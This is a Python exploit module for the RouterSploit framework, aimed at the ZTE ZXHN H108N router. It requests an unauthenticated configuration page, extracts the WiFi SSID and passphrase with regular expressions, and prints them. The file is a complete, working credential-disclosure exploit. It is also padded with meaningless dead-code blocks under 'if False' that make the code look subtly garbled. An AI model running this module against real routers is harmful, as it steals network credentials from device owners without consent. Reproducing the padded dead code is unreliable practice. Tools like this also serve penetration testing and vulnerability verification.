import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'ZTE ZXHN H108N Wifi Password Disclosure', 'description': 'Module exploits ZTE ZXHN H108N WiFi Password Disclosure vulnerability that allows to retrieve password for wifi connection.', 'authors': ('Mostafa Nafady', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://github.com/threat9/routersploit/issues/588',), 'devices': ('ZTE ZXHN H108N',)}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')

    def run(self):
        if False:
            print('Hello World!')
        credentials = self.get_credentials()
        if credentials:
            print_success('Target is vulnerable')
            (ssid, password) = credentials
            creds = [('SSID Name', ssid), ('Password', password)]
            print_status('Discovered information:')
            print_table(('Parameter', 'Value'), *creds)
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    def get_credentials(self):
        if False:
            i = 10
            return i + 15
        response = self.http_request(method='GET', path='/wizard_wlan_t.gch')
        if response:
            ssid = ''
            password = ''
            res = [r for r in re.findall("Transfer_meaning\\('ESSID','(.*?)'\\);", response.text) if r]
            if res:
                ssid = res[0]
            res = [r for r in re.findall("Transfer_meaning\\('KeyPassphrase','(.*?)'\\);", response.text) if r]
            if res:
                password = res[0]
            if ssid or password:
                return (ssid, password)
        return None

    @mute
    def check(self):
        if False:
            while True:
                i = 10
        credentials = self.get_credentials()
        if credentials:
            return True
        return False